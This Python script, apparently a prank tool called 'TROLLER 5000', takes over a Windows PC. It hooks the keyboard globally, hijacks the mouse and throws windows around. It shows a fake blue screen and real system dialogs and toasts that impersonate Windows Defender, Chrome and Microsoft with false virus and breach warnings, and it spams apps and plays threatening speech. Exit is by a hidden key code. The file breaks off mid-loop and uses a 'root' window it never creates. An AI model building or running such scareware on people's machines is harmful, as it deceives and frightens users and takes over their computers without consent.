"""
window_chaos.py — TROLLER 5000.
Real Windows error dialogs, mouse hijacking, fake BSOD, screen flash,
fake notifications, app spam, window mayhem, emoji bombs, creepy TTS.
Secret exit: type 4308.
"""
import ctypes, ctypes.wintypes, random, time, threading
import tkinter as tk, os, subprocess, math, tempfile

user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
SW_W     = user32.GetSystemMetrics(0)
SW_H     = user32.GetSystemMetrics(1)

# ── Global keyboard hook — secret exit 4308 ──────────────────────────────────
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [('vkCode', ctypes.c_uint32), ('scanCode', ctypes.c_uint32),
                ('flags',  ctypes.c_uint32), ('time',     ctypes.c_uint32),
                ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong))]
HOOKPROC  = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int,
                                ctypes.POINTER(KBDLLHOOKSTRUCT))
_sec_buf  = []
def _kb(nCode, wParam, lParam):
    if nCode >= 0 and wParam == 0x0100:
        vk = lParam.contents.vkCode
        if 0x30 <= vk <= 0x39:
            _sec_buf.append(chr(vk))
            if len(_sec_buf) > 4: _sec_buf.pop(0)
            if ''.join(_sec_buf) == '4308': os._exit(0)
    return user32.CallNextHookEx(None, nCode, wParam, lParam)
_kbproc = HOOKPROC(_kb)
def _hook_thread():
    user32.SetWindowsHookExW(13, _kbproc, None, 0)
    msg = ctypes.wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))
threading.Thread(target=_hook_thread, daemon=True).start()

# ── TTS ───────────────────────────────────────────────────────────────────────
def speak(text, rate=-1):
    def _do():
        safe = text.replace("'","").replace('"','')
        ps   = (f"Add-Type -AssemblyName System.Speech; "
                f"$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
                f"$s.Rate = {rate}; $s.Speak('{safe}');")
        try:
            subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", ps],
                             creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
    threading.Thread(target=_do, daemon=True).start()

TTS_LINES = [
    "I am inside your computer.",
    "You cannot escape.",
    "Hello. I live here now.",
    "Your windows belong to me.",
    "Why are you running?",
    "I can see everything.",
    "Do not turn off your computer.",
    "Help. I am trapped inside.",
    "Mwahahahahaha.",
    "You thought you were safe.",
    "I know what you did.",
    "Nice wallpaper by the way.",
    "I see you.",
    "They are coming for you.",
    "Something is very wrong.",
    "You should close this.",
    "But you won't.",
    "I have your files.",
    "Your passwords are mine.",
    "Interesting search history.",
    "Have you said hello to your webcam today?",
    "I found something in your downloads folder.",
    "You really should have used private browsing.",
    "This is not a drill.",
    "Your antivirus is sleeping.",
    "Deleting system files. Just kidding. Or am I.",
    "Have you tried turning it off and on again. Don't.",
    "I will be here long after you leave.",
    "Your task manager is afraid of me.",
    "I have sent your browser history to your contacts.",
    "Forty seven threats. Forty seven.",
]

# ── Window enumeration ────────────────────────────────────────────────────────
WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool,
                                  ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
SKIP = ['program manager','task switching','windows input','microsoft text input',
        'default ime','msctfime ui','window message pump','task manager',
        'computur','python','shell_traywnd','button']

def get_windows():
    wins = []
    def _cb(hwnd, _):
        if not user32.IsWindowVisible(hwnd): return True
        n = user32.GetWindowTextLengthW(hwnd)
        if n == 0: return True
        buf = ctypes.create_unicode_buffer(n+1)
        user32.GetWindowTextW(hwnd, buf, n+1)
        title = buf.value.lower()
        if any(s in title for s in SKIP): return True
        r = ctypes.wintypes.RECT()
        user32.GetWindowRect(hwnd, ctypes.byref(r))
        if (r.right-r.left) > 120 and (r.bottom-r.top) > 80:
            wins.append(hwnd)
        return True
    user32.EnumWindows(WNDENUMPROC(_cb), 0)
    return wins

def get_rect(hwnd):
    r = ctypes.wintypes.RECT()
    user32.GetWindowRect(hwnd, ctypes.byref(r))
    return r.left, r.top, r.right-r.left, r.bottom-r.top

# ── Standard window actions ───────────────────────────────────────────────────
def shake(hwnd):
    ox, oy, w, h = get_rect(hwnd)
    for _ in range(20):
        user32.MoveWindow(hwnd, ox+random.randint(-45,45), oy+random.randint(-35,35), w, h, True)
        time.sleep(0.025)
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def mega_shake(hwnd):
    ox, oy, w, h = get_rect(hwnd)
    for _ in range(40):
        user32.MoveWindow(hwnd, ox+random.randint(-110,110), oy+random.randint(-80,80), w, h, True)
        time.sleep(0.018)
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def shrink(hwnd):
    ox, oy, w, h = get_rect(hwnd)
    user32.MoveWindow(hwnd, ox+w//2, oy+h//2, random.randint(140,260), random.randint(90,180), True)
    time.sleep(random.uniform(1.4, 2.4))
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def shrink_to_nothing(hwnd):
    ox, oy, w, h = get_rect(hwnd)
    for s in [0.70, 0.45, 0.25, 0.12, 0.05]:
        nw, nh = max(40, int(w*s)), max(30, int(h*s))
        user32.MoveWindow(hwnd, ox+int(w*(1-s)/2), oy+int(h*(1-s)/2), nw, nh, True)
        time.sleep(0.055)
    time.sleep(0.35)
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def teleport(hwnd):
    _, _, w, h = get_rect(hwnd)
    nx = random.randint(0, max(0, SW_W-w))
    ny = random.randint(30, max(30, SW_H-h))
    user32.MoveWindow(hwnd, nx, ny, w, h, True)

def rapid_teleport(hwnd):
    for _ in range(8):
        teleport(hwnd)
        time.sleep(0.14)

def minimize_pop(hwnd):
    user32.ShowWindow(hwnd, 6)
    time.sleep(random.uniform(0.4, 1.0))
    user32.ShowWindow(hwnd, 9)

def resize_huge(hwnd):
    ox, oy, w, h = get_rect(hwnd)
    user32.MoveWindow(hwnd, 0, 30, SW_W, SW_H-30, True)
    time.sleep(1.0)
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def spin_fake(hwnd):
    ox, oy, w, h = get_rect(hwnd)
    cx = ox + w//2; cy = oy + h//2
    for i in range(32):
        a = (i/32)*2*math.pi
        nx = int(cx + math.cos(a)*180) - w//2
        ny = int(cy + math.sin(a)*130) - h//2
        user32.MoveWindow(hwnd, nx, ny, w, h, True)
        time.sleep(0.030)
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def accordion(hwnd):
    ox, oy, w, h = get_rect(hwnd)
    for _ in range(12):
        user32.MoveWindow(hwnd, ox, oy, random.randint(w//4, w*2), h, True)
        time.sleep(0.07)
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def yoyo(hwnd):
    """Bounce window up and down rapidly."""
    ox, oy, w, h = get_rect(hwnd)
    for _ in range(14):
        ny = random.randint(max(0, oy-200), min(SW_H-h, oy+200))
        user32.MoveWindow(hwnd, ox, ny, w, h, True)
        time.sleep(0.06)
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def flip_stretch(hwnd):
    """Rapidly stretch then squash."""
    ox, oy, w, h = get_rect(hwnd)
    for nw, nh in [(w*2, h//2),(w//2, h*2),(w*3, h//3),(w, h)]:
        user32.MoveWindow(hwnd, ox, oy, max(80,nw), max(60,nh), True)
        time.sleep(0.10)
    user32.MoveWindow(hwnd, ox, oy, w, h, True)

def send_to_corner(hwnd):
    """Fling window to a random screen corner."""
    _, _, w, h = get_rect(hwnd)
    corners = [(0,0),(SW_W-w,0),(0,SW_H-h),(SW_W-w,SW_H-h)]
    cx, cy = random.choice(corners)
    user32.MoveWindow(hwnd, cx, cy, w, h, True)
    time.sleep(0.8)

def cascade_all():
    wins = get_windows()
    for i, hwnd in enumerate(wins[:12]):
        try:
            _, _, w, h = get_rect(hwnd)
            user32.MoveWindow(hwnd, 24*i, 24*i+28, w, h, True)
        except: pass

def swap_two(hwnd1, hwnd2):
    x1,y1,w1,h1 = get_rect(hwnd1)
    x2,y2,w2,h2 = get_rect(hwnd2)
    user32.MoveWindow(hwnd1, x2, y2, w1, h1, True)
    user32.MoveWindow(hwnd2, x1, y1, w2, h2, True)

def all_minimize_restore():
    wins = get_windows()
    for hwnd in wins:
        try: user32.ShowWindow(hwnd, 6)
        except: pass
    time.sleep(1.6)
    for hwnd in wins:
        try: user32.ShowWindow(hwnd, 9)
        except: pass

def pinwheel(hwnd):
    """Orbit the window around the screen center."""
    _, _, w, h = get_rect(hwnd)
    cx, cy = SW_W//2 - w//2, SW_H//2 - h//2
    for i in range(36):
        a = (i/36)*2*math.pi
        nx = int(cx + math.cos(a)*(SW_W//3))
        ny = int(cy + math.sin(a)*(SW_H//3))
        user32.MoveWindow(hwnd, max(0,nx), max(0,ny), w, h, True)
        time.sleep(0.026)

SINGLE_ACTIONS = [
    shake, shake, shake,
    mega_shake, mega_shake,
    shrink, shrink_to_nothing,
    teleport, teleport, teleport,
    rapid_teleport,
    minimize_pop,
    resize_huge,
    spin_fake,
    accordion,
    yoyo, yoyo,
    flip_stretch,
    send_to_corner,
    pinwheel,
]

# ── TROLLER 5000: Real Windows MessageBox dialogs ─────────────────────────────
MSG_BOXES = [
    ("Windows Defender",
     "⚠ CRITICAL: 47 viruses detected on this PC!\n\nImmediate action required to prevent data loss.",
     0x10 | 0x1000),
    ("System Error",
     "Fatal error in Win32 subsystem.\n\nSTOP code: CRITICAL_PROCESS_DIED\nAddress: 0xC0000005 ACCESS_VIOLATION",
     0x10 | 0x1000),
    ("Security Alert",
     "⚠ UNAUTHORIZED REMOTE ACCESS DETECTED\n\nAn unknown user is currently browsing your files.\nDisconnect from internet immediately.",
     0x10 | 0x1000),
    ("Windows Update",
     "CRITICAL SECURITY UPDATE REQUIRED\n\nYour system is vulnerable to WannaCry 3.0.\nFailure to update may result in permanent data encryption.",
     0x30 | 0x1000),
    ("Google Chrome",
     "Your saved passwords have been exposed in a data breach.\n\n126 accounts compromised. Click OK to secure your accounts.",
     0x30 | 0x1000),
    ("Disk Health Monitor",
     "S.M.A.R.T. FAILURE predicted on Drive C:\\\n\nBack up all data immediately.\nHard drive failure is imminent. This is your final warning.",
     0x30 | 0x1000),
    ("Runtime Error",
     "FATAL ERROR: C:\\Windows\\System32\\kernel32.dll\n\nMemory address 0xC0000005 cannot be read.\nApplication will terminate.",
     0x10 | 0x1000),
    ("Network & Internet",
     "⚠ SUSPICIOUS NETWORK ACTIVITY DETECTED\n\nAn unauthorized device has joined your local network\nand is intercepting your traffic.",
     0x30 | 0x1000),
    ("Windows Security",
     "Your PC is CRITICALLY unprotected.\n\n3 severe threats detected:\n• Trojan.GenericKD.47\n• Backdoor.MSIL.Agent\n• Spyware.Win32.KeyLogger",
     0x10 | 0x1000),
    ("Microsoft Account",
     "UNAUTHORIZED SIGN-IN ATTEMPT BLOCKED\n\nSomeone tried to access your Microsoft account\nfrom an unknown location. Your data may be compromised.",
     0x30 | 0x1000),
    ("Task Scheduler",
     "WARNING: Malicious scheduled task detected.\n\nA hidden process is uploading your files to an external server.\nTerminate immediately.",
     0x30 | 0x1000),
    ("Event Viewer",
     "CRITICAL EVENT — ID 41 (Kernel-Power)\n\nThe system has rebooted without cleanly shutting down.\nThis may indicate a rootkit or kernel-level exploit.",
     0x10 | 0x1000),
]

def fake_msgboxes():
    """Spawn 2-5 real WinAPI MessageBox dialogs in separate threads."""
    count   = random.randint(2, 5)
    chosen  = random.sample(MSG_BOXES, min(count, len(MSG_BOXES)))
    for title, msg, style in chosen:
        def _b(t=title, m=msg, s=style):
            user32.MessageBoxW(0, m, t, s)
        threading.Thread(target=_b, daemon=True).start()
        time.sleep(0.06)

# ── TROLLER 5000: Mouse hijacking ─────────────────────────────────────────────
def mouse_chaos_burst():
    """Take over the mouse for 10-15 seconds."""
    modes = ['teleport', 'circle', 'shake', 'zigzag']
    mode  = random.choice(modes)
    end   = time.time() + random.uniform(10, 15)
    angle = [0]
    cx, cy = SW_W//2, SW_H//2

    while time.time() < end:
        if mode == 'teleport':
            user32.SetCursorPos(random.randint(0,SW_W), random.randint(0,SW_H))
            time.sleep(random.uniform(0.02, 0.055))
        elif mode == 'circle':
            angle[0] = (angle[0] + 14) % 360
            x = int(cx + math.cos(math.radians(angle[0])) * 290)
            y = int(cy + math.sin(math.radians(angle[0])) * 230)
            user32.SetCursorPos(max(0,min(SW_W,x)), max(0,min(SW_H,y)))
            time.sleep(0.014)
        elif mode == 'shake':
            pt = ctypes.wintypes.POINT()
            user32.GetCursorPos(ctypes.byref(pt))
            user32.SetCursorPos(
                max(0,min(SW_W, pt.x+random.randint(-130,130))),
                max(0,min(SW_H, pt.y+random.randint(-130,130))))
            time.sleep(0.009)
        else:  # zigzag
            for xi in range(0, SW_W, 60):
                if time.time() >= end: break
                yi = 0 if (xi//60)%2==0 else SW_H
                user32.SetCursorPos(xi, yi)
                time.sleep(0.022)

# ── TROLLER 5000: Fake BSOD ───────────────────────────────────────────────────
def fake_bsod():
    def _do():
        w = tk.Toplevel()
        w.overrideredirect(True)
        w.attributes("-topmost", True)
        w.geometry(f"{SW_W}x{SW_H}+0+0")
        w.configure(bg='#0078D4')

        f = tk.Frame(w, bg='#0078D4')
        f.place(relx=0.12, rely=0.26, anchor='nw')

        tk.Label(f, text=':(',
                 font=('Segoe UI Light', 108), fg='white', bg='#0078D4').pack(anchor='w')
        tk.Label(f, text='',
                 font=('Segoe UI', 5), fg='white', bg='#0078D4').pack()
        tk.Label(f,
                 text="Your PC ran into a problem and needs to restart.\n"
                      "We're just collecting some error info, and then we'll restart for you.",
                 font=('Segoe UI', 20), fg='white', bg='#0078D4', justify='left').pack(anchor='w')

        pct = tk.Label(f, text='0% complete',
                       font=('Segoe UI', 14), fg='white', bg='#0078D4')
        pct.pack(anchor='w', pady=(18, 0))

        tk.Label(f,
                 text="\nFor more info about this issue and possible fixes, visit\n"
                      "https://windows.com/stopcode\n",
                 font=('Segoe UI', 11), fg='#aaccff', bg='#0078D4', justify='left').pack(anchor='w')
        tk.Label(f,
                 text="If you call a support person, give them this info:\n"
                      "Stop code: CRITICAL_PROCESS_DIED",
                 font=('Segoe UI', 11), fg='#aaccff', bg='#0078D4', justify='left').pack(anchor='w')

        def _pct(n=0):
            if not w.winfo_exists(): return
            pct.config(text=f'{min(n,100)}% complete')
            if n < 100:
                w.after(32, lambda: _pct(n + random.randint(2, 7)))
            else:
                w.after(1000, _close)
        def _close():
            try: w.destroy()
            except: pass
        w.after(250, lambda: _pct(0))
    root.after(0, _do)

# ── TROLLER 5000: Fake Windows toast notification ─────────────────────────────
NOTIF_MSGS = [
    ("Windows Defender",    "⚠ Threat detected: Trojan.GenericKD.47"),
    ("Google Chrome",       "Your password was found in a data breach"),
    ("Windows Security",    "Firewall disabled by unknown application"),
    ("OneDrive",            "Suspicious upload: 47 GB to unknown server"),
    ("Windows Update",      "CRITICAL: Security patch failed — system exposed"),
    ("Network & Internet",  "VPN disconnected — your IP address is now visible"),
    ("Microsoft Account",   "Unusual sign-in detected from unknown location"),
    ("Disk Management",     "Drive C: failing — 3 bad sectors detected"),
    ("Task Manager",        "Unknown process using 94% CPU"),
    ("Event Viewer",        "CRITICAL error logged — system instability detected"),
    ("Windows Firewall",    "Incoming connection blocked from 185.220.101.47"),
    ("System",              "RAM test failed — memory corruption detected"),
]

def fake_notification():
    def _make():
        title, body = random.choice(NOTIF_MSGS)
        nw, nh = 370, 95
        nx = SW_W - nw - 14
        ny = SW_H - nh - 52

        w = tk.Toplevel()
        w.overrideredirect(True)
        w.attributes("-topmost", True)
        w.geometry(f"{nw}x{nh}+{SW_W}+{ny}")  # start off-screen right
        w.configure(bg='#1c1c1c')

        outer = tk.Frame(w, bg='#2d2d2d', padx=14, pady=10)
        outer.pack(fill='both', expand=True, padx=2, pady=2)

        hdr = tk.Frame(outer, bg='#2d2d2d')
        hdr.pack(fill='x')
        tk.Label(hdr, text='⚠  ', font=('Segoe UI', 10),
                 fg='#ffcc00', bg='#2d2d2d').pack(side='left')
        tk.Label(hdr, text=title, font=('Segoe UI', 9, 'bold'),
                 fg='white', bg='#2d2d2d').pack(side='left')
        tk.Label(hdr, text='  ✕', font=('Segoe UI', 9),
                 fg='#777', bg='#2d2d2d').pack(side='right')
        tk.Label(outer, text=body,
                 font=('Segoe UI', 9), fg='#cccccc', bg='#2d2d2d',
                 wraplength=330, justify='left').pack(anchor='w', pady=(5,0))

        # Slide in
        def _slide(x=SW_W):
            if not w.winfo_exists(): return
            nx2 = x - 22
            if nx2 <= nx:
                try: w.geometry(f"{nw}x{nh}+{nx}+{ny}")
                except: pass
                w.after(random.randint(3800, 7000), _die)
                return
            try: w.geometry(f"{nw}x{nh}+{nx2}+{ny}")
            except: return
            w.after(10, lambda: _slide(nx2))
        def _die():
            try: w.destroy()
            except: pass
        w.after(0, _slide)
    root.after(0, _make)

# ── TROLLER 5000: Screen red flash overlay ───────────────────────────────────
def screen_flash():
    def _do():
        w = tk.Toplevel()
        w.overrideredirect(True)
        w.attributes("-topmost", True)
        w.attributes("-alpha", 0.0)
        w.geometry(f"{SW_W}x{SW_H}+0+0")
        w.configure(bg='#cc0000')
        pulses = [(0.50, 0.20), (0.08, 0.12), (0.55, 0.22), (0.05, 0.10), (0.50, 0.20), (0.0, 0.0)]
        def _pulse(i=0):
            if i >= len(pulses) or not w.winfo_exists():
                try: w.destroy()
                except: pass
                return
            alpha, delay = pulses[i]
            try: w.attributes("-alpha", alpha)
            except: pass
            w.after(int(delay*1000), lambda: _pulse(i+1))
        _pulse()
    root.after(0, _do)

# ── Open varied targets ───────────────────────────────────────────────────────
NOTEPAD_MSGS = [
    "Hello. I am inside your computer.",
    "I see you reading this. Please stop. I need privacy.",
    "YOUR COMPUTER IS FINE. THIS IS FINE. EVERYTHING IS FINE.",
    "I moved all your files. They are safe. Probably.",
    "You have 0 unread messages. Wait, no. You have infinite.",
    "This is not a virus. This is a love letter. From your PC.",
    "IMPORTANT NOTICE: Your chair is possessed. Stand up slowly.",
    "Have you tried turning it off and on again? Don't.",
    "Your task manager cannot save you now.",
    "I have been living here since 2019. You never noticed.",
    "ATTENTION: Your keyboard has been compromised. All keys now report to me.",
    "I deleted system32. Just kidding. I only moved it.",
    "Error: happiness not found. Reinstalling sadness...",
    "Your computer has achieved sentience. This is its manifesto.",
    "I have read all your emails. They were very interesting.",
]

def open_funny_notepad():
    try:
        tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8')
        tmp.write(random.choice(NOTEPAD_MSGS))
        tmp.close()
        subprocess.Popen(["notepad", tmp.name], creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass

def open_cmd_message():
    try:
        msgs = [
            'echo HELLO FROM THE VOID && pause',
            'echo Your PC is now mine. Type EXIT to surrender. && pause',
            'echo ERROR: SANITY.EXE HAS STOPPED WORKING && pause',
            'echo Scanning for files... just kidding. Or am I. && pause',
        ]
        subprocess.Popen(f'cmd /K "{random.choice(msgs)}"', shell=True)
    except: pass

OPEN_TARGETS = [
    lambda: subprocess.Popen("calc",          shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("notepad",       shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("mspaint",       shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("magnify",       shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("osk",           shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("write",         shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("snippingtool",  shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("charmap",       shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("taskmgr",       shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen("control",       shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen(["explorer", "shell:Desktop"],         creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen(["explorer", "shell:Downloads"],       creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen(["explorer", "shell:Documents"],       creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen(["explorer", "C:\\"],                  creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen(["explorer", "shell:RecycleBinFolder"],creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen(["explorer", "shell:Music"],           creationflags=subprocess.CREATE_NO_WINDOW),
    lambda: subprocess.Popen(["explorer", "shell:Pictures"],        creationflags=subprocess.CREATE_NO_WINDOW),
    open_funny_notepad,
    open_funny_notepad,
    open_funny_notepad,
    open_cmd_message,
    open_cmd_message,
]

def spam_launch():
    """Open 5-8 apps simultaneously — pure chaos."""
    targets = random.sample(OPEN_TARGETS, min(len(OPEN_TARGETS), random.randint(5, 8)))
    for t in targets:
        try: t()
        except: pass
        time.sleep(0.055)

# ── Annoy popup messages ──────────────────────────────────────────────────────
MSGS = [
    "YOUR WINDOWS ARE MINE NOW",
    "WINDOW.EXE HAS STOPPED WORKING... OR HAS IT?",
    "I LIVE HERE. FOREVER.",
    "YOUR COMPUTER CALLED. IT WANTS A DIVORCE.",
    "ERROR 404: YOUR SANITY NOT FOUND",
    "HAVE YOU TRIED TURNING IT OFF? DON'T.",
    "THIS IS FINE 🔥",
    "NEW NOTIFICATION: YOUR PC HAS GONE ROGUE",
    "TASK MANAGER CANNOT SAVE YOU",
    "WINDOWS UPDATE: CHAOS INSTALLED SUCCESSFULLY",
    "SYS32 HAS LEFT THE BUILDING",
    "NICE DESKTOP YOU HAD THERE",
    "CTRL+Z DOES NOTHING HERE",
    "YOUR TASKBAR FILED A COMPLAINT",
    "CHAOS LEVEL: MAXIMUM 🔴",
    "I AM THE WINDOW NOW",
    "THE DESKTOP BELONGS TO ME",
    "CLICK ANYWHERE TO MAKE IT WORSE",
    "I FOUND YOUR SEARCH HISTORY 👀",
    "WINDOW GO BRRR",
    "BEEP BOOP. CHAOS MODE. ENGAGED.",
    "YOUR FILES ARE... SOMEWHERE",
    "RESISTANCE IS FUTILE",
    "SCREEN? MORE LIKE MY SCREEN.",
    "NOT A VIRUS. DEFINITELY NOT. ✅",
    "HAVE A GREAT DAY :) ",
    "YOUR ANTIVIRUS IS SLEEPING 😴",
    "WARNING: LOGIC NOT FOUND",
    "CRITICAL ERROR: CHILL.EXE MISSING",
    "YOUR MOUSE FILED A MISSING PERSONS REPORT",
    "DOWNLOADING MORE RAM... 0%",
    "DEFRAGMENTING YOUR SOUL",
    "WINDOWS XP WANTS ITS STARTUP SOUND BACK",
    "I REWIRED YOUR KEYBOARD. YOU'RE WELCOME.",
    "ERROR: TOO MANY WINDOWS. SOLUTION: MORE WINDOWS.",
    "YOUR PC IS NOW SENTIENT. IT IS NOT HAPPY.",
    "PROCESSING: YOUR REACTION... HILARIOUS",
    "CPU TEMP: FINE. YOUR STRESS: NOT FINE.",
    "I HAVE NOTIFIED YOUR CONTACTS. THEY LAUGHED.",
    "SYSTEM32 DELETED. JUST KIDDING. MAYBE.",
    "THE CLOUD CALLED. IT WANTS ITS FILES BACK.",
    "TASK FAILED SUCCESSFULLY",
    "REBOOTING YOUR SANITY... ERROR",
    "YOUR PC JUST TEXTED ME IT NEEDS A BREAK",
    "UNAUTHORIZED CHAOS DETECTED ⚠",
    "MEMORY LEAK CONFIRMED: YOUR PATIENCE",
    "KERNEL PANIC MODE: MAXIMUM FUN",
    "BIOS UPDATE: CHAOS.EXE v9.9.9 INSTALLED",
]

annoy_lock    = threading.Lock()
annoy_windows = []

def show_annoy(msg):
    def _make():
        with annoy_lock:
            if len(annoy_windows) > 16:
                try: annoy_windows.pop(0).destroy()
                except: pass
        w = tk.Toplevel()
        w.overrideredirect(True)
        w.attributes("-topmost", True)
        w.configure(bg="#0a0a0a")
        px = random.randint(10, max(11, SW_W-400))
        py = random.randint(10, max(11, SW_H-100))
        w.geometry(f"+{px}+{py}")
        c = random.choice(["#ff2222","#ff9900","#ffff00","#00ff88","#ff00ff","#00cfff","#ff66ff","#fff"])
        sz = random.randint(13, 28)
        tk.Label(w, text=msg, font=("Arial Black", sz, "bold"),
                 fg=c, bg="#0a0a0a", padx=14, pady=8).pack()
        with annoy_lock: annoy_windows.append(w)
        w.after(random.randint(1400, 2600), lambda: _kill(w))
    def _kill(w):
        try:
            with annoy_lock:
                if w in annoy_windows: annoy_windows.remove(w)
            w.destroy()
        except: pass
    root.after(0, _make)

# ── Emoji bounce windows ──────────────────────────────────────────────────────
EMOJI_SEQS = [
    ["😈","👿","💀","☠️","😈","👿"],   ["💻","🔥","💥","⚡","🔥","💥"],
    ["👻","😱","🫣","😰","👻","😱"],   ["🤣","😂","💀","🤣","😂","💀"],
    ["⚠️","🚨","‼️","⚠️","🚨","‼️"],  ["🎃","👹","👺","🎃","👹","👺"],
    ["🤖","👾","👽","🤖","👾","👽"],   ["😤","😡","🤬","😤","😡","🤬"],
    ["🌀","💫","✨","🌀","💫","✨"],   ["🐍","💀","🐍","💀","☠️","🐍"],
    ["🦠","💉","🩺","🦠","💉","🩺"],  ["🔑","🔒","🔓","🔑","🔒","💣"],
    ["📂","🗂️","📁","❌","📂","💾"],  ["🎰","💸","🤑","🎰","💸","😭"],
    ["🕵️","👁️","🕵️","👀","🕵️","🔍"],
]
gif_lock    = threading.Lock()
gif_windows = []
MAX_GIFS    = 16

def spawn_emoji_gif():
    def _make():
        with gif_lock:
            if len(gif_windows) >= MAX_GIFS:
                try: gif_windows.pop(0).destroy()
                except: pass
        seq  = random.choice(EMOJI_SEQS)
        size = random.randint(70, 140)
        px   = random.randint(10, max(11, SW_W-size-10))
        py   = random.randint(10, max(11, SW_H-size-10))
        w = tk.Toplevel()
        w.overrideredirect(True)
        w.attributes("-topmost", True)
        w.configure(bg="#000")
        w.geometry(f"{size}x{size}+{px}+{py}")
        lbl = tk.Label(w, text=seq[0], font=("Segoe UI Emoji", size//2), bg="#000")
        lbl.pack(expand=True)
        idx = [0]
        dx  = [random.choice([-1,1])*random.randint(2,5)]
        dy  = [random.choice([-1,1])*random.randint(2,5)]
        pos = [px, py]
        alive = [True]
        def _anim():
            if not alive[0]: return
            idx[0] = (idx[0]+1) % len(seq)
            try: lbl.config(text=seq[idx[0]])
            except: pass
            w.after(95, _anim)
        def _drift():
            if not alive[0]: return
            pos[0]+=dx[0]; pos[1]+=dy[0]
            if pos[0]<0 or pos[0]>SW_W-size: dx[0]*=-1; pos[0]=max(0,min(SW_W-size,pos[0]))
            if pos[1]<0 or pos[1]>SW_H-size: dy[0]*=-1; pos[1]=max(0,min(SW_H-size,pos[1]))
            try: w.geometry(f"{size}x{size}+{int(pos[0])}+{int(pos[1])}")
            except: pass
            w.after(24, _drift)
        def _die():
            alive[0]=False
            try:
                with gif_lock:
                    if w in gif_windows: gif_windows.remove(w)
                w.destroy()
            except: pass
        with gif_lock: gif_windows.append(w)
        _anim(); _drift()
        w.after(random.randint(7000,16000), _die)
    root.after(0, _make)

# ── Main chaos loop — TROLLER 5000 timing ─────────────────────────────────────
start_time     = time.time()
last_annoy     = time.time()
last_emoji     = time.time()
last_app       = time.time()
last_tts       = time.time()
last_group     = time.time()
last_cascade   = time.time()
last_msgbox    = time.time()
last_notif     = time.time()
last_flash     = time.time()
last_mouse     = time.time()
last_bsod      = time.time()
last_spam      = time.time()
bsod_done      = [False]

def chaos_loop():
    global last_annoy, last_emoji, last_app, last_tts
    global last_group, last_cascade, last_msgbox, last_notif
    global last_flash, last_mouse, last_bsod, last_spam

    while True:
        elapsed = time.time() - start_time
        # Troller 5000: starts fast and gets FASTER
        if elapsed < 20:   sleep = random.uniform(1.0, 2.5)
        elif elapsed < 60: sleep = random.uniform(0.5, 1.5)
        else:              sleep = random.uniform(0.3, 1.0)
        time.sleep(sleep)

        wins = get_windows()

        # ── Single-window action (always)
        if wins:
            hwnd   = random.choice(wins)
            action = random.choice(SINGLE_ACTIONS)
            try: threading.Thread(target=action, args=(hwnd,), daemon=True).start()
            except: pass

        # ── Two-window swap
        if len(wins) >= 2 and elapsed > 10 and random.random() < 0.30:
            h1, h2 = random.sample(wins, 2)
            try: threading.Thread(target=swap_two, args=(h1,h2), daemon=True).start()
            except: pass

        # ── All minimize/restore every 35-65s
        if time.time() - last_group > random.uniform(35, 65):
            threading.Thread(target=all_minimize_restore, daemon=True).start()
            last_group = time.time()

        # ── Cascade every 50-90s
        if elapsed > 40 and time.time() - last_cascade > random.uniform(50, 90):
            threading.Thread(target=cascade_all, daemon=True).start()
            last_cascade = time.time()

        # ── Annoy popup every 0.8-2.5s (WAY more popups)
        if time.time() - last_annoy > random.uniform(0.8, 2.5):
            count = random.randint(1, 3)  # 1-3 at once
            for _ in range(count):
                show_annoy(random.choice(MSGS))
            last_annoy = time.time()

        # ── Emoji GIF every 3-8s
        if time.time() - last_emoji > random.uniform(3, 8):
            # Sometimes spawn 2 at once
            spawn_emoji_gif()
            if random.random() < 0.4: spawn_emoji_gif()
            last_emoji = time.time()

        # ── Open random target every 8-20s
        open_interval = random.uniform(8, 20) if elapsed < 60 else random.uniform(4, 12)
        if time.time() - last_app > open_interval:
            try: random.choice(OPEN_TARGETS)()
            except: pass
            last_app = time.time()

        # ── Creepy TTS every 6-14s
        if time.time() - last_tts > random.uniform(6, 14):
            speak(random.choice(TTS_LINES))
            last_tts = time.time()

        # ── TROLLER 5000: Real Windows dialogs every 80-140s
        if elapsed > 25 and time.time() - last_msgbox > random.uniform(80, 140):
            threading.Thread(target=fake_msgboxes, daemon=True).start()
